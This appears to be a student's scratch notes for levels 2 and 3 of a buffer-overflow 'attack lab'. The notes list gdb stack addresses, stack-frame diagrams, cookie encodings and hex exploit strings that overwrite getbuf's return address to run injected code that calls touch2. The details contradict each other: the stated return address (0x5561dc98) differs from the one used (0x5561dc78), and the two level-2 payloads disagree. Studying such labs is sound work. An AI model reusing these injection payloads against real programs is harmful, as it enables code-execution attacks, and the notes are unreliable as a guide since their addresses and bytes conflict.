=================Level 2===============================
00000000004017a8 <getbuf>
0000000000401968 <test>:
break points
test:
break points                                %rsp            
(1)*0x401971(before call to getbuf)        0x5561dca8
(2)*0x401976(after call to getbuf)         0x5561dca8
getbuf
(3)*0x4017a8(first inst of getbuf)         0x5561dca0 (location where return address in test is stored) ---> 0x401976
(4)*0x4017ac(after allocating buf)         0x5561dc78 (start address of %rsp in getbuf) --->start of buffer (40 bytes)
(5)*0x4017b4(after call to Gets)           0x5561dc78
(6)*0x4017bd(just before retq)             0x5561dca0
Gets
(7)*0x401a40(first inst of Gets)           0x5561dc70 (location where return address in getbuf is stored) ---> 0x4017b4
(8)*0x401a91(last inst of Gets)            0x5561dc70
Order in which breakpoints will encounter
1-3-4-7-8-5-6-2
So accessable stack addresses for our code injection is
0x5561dc98-0x5561dc78
so value to be stored as return address 0x000000005561dc98
address of touch2: 0x00000000004017ec 

exploit string
68 ec 17 40 00 bf fa 97
b9 59 c3 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ec 17 40 00 00 00 00 00
drawing stack frame
    mem         contents              desp
0x5561dca8       xxxxx               %rsp before call to getbuf in test
0x5561dca0      0x401976             %rsp for first instruction in buff contains return address in test function
0x5561dc78       xxxxx               allocation of buffer in getbuf (0xa0-0x78=0x28) = 40 bytes
0x5561dc70      0x4017b4             %rsp for first instruction in Gets contains return address in getbuf function

for below exploit string address of memory written
%rsp = 0x5561dc78 

  mem          0  1  2  3  4  5  6  7
0x5561dc78    bf fa 97 b9 59 c3 00 00  /* code to set %rdi and return */
0x5561dc80    00 00 00 00 00 00 00 00
0x5561dc88    00 00 00 00 00 00 00 00
0x5561dc90    00 00 00 00 00 00 00 00
0x5561dc98    00 00 00 00 00 00 00 00 
0x5561dca0    78 dc 61 55 00 00 00 00 /* start address of injected code */
0x5561dca8    ec 17 40 00 00 00 00 00 /* address of touch2 function */ 
=======================================================
=================Level 3===============================
cookie: 0x59b997fa
digit   string_representation
  5         35
  9         39
  b         62
  9         39
  9         39
  7         37
  f         66
  a         61
Breakpoints                                   %rsp
(1)*0x401971(before call to getbuf)        0x5561dca8
(2)*0x401976(after call to getbuf)         0x5561dca8
getbuf
(3)*0x4017a8(first inst of getbuf)         0x5561dca0 (location where return address in test is stored) ---> 0x401976
(4)*0x4017ac(after allocating buf)         0x5561dc78 (start address of %rsp in getbuf) --->start of buffer (40 bytes)
(5)*0x4017b4(after call to Gets)           0x5561dc78
(6)*0x4017bd(just before retq)             0x5561dca0
Gets
(7)*0x401a40(first inst of Gets)           0x5561dc70 (location where return address in getbuf is stored) ---> 0x4017b4
(8)*0x401a91(last inst of Gets)            0x5561dc70
touch3
(9)*0x4018fa(first inst of touch3)         0x5561dca8
(10)*0x401963(last inst of touch3)         0x5561dca8
hexmatch
(11)*0x401854(after allocating stack)      0x5561dc00
(12)*0x4018f9(after deallocating stack)    0x5561dc98
Order in which breakpoints will encounter
1-3-4-7-8-5-6-2-9-11-12-10
After observing code for hexmatch we see that it modifies memory address 0x5561dc78
Which happens to be start address for buffer allocated in getbuf function. So should
start our injected code from address 0x5561dc80 or 0x5561dc88
first place string representation of cookies from address 0x5561dc80-0x5561dc88 (8+1bytes)
then place code for setting pointer to our cookie string from address 0x5561dc90. And this is
the return address from getbuf function.
=======================================================
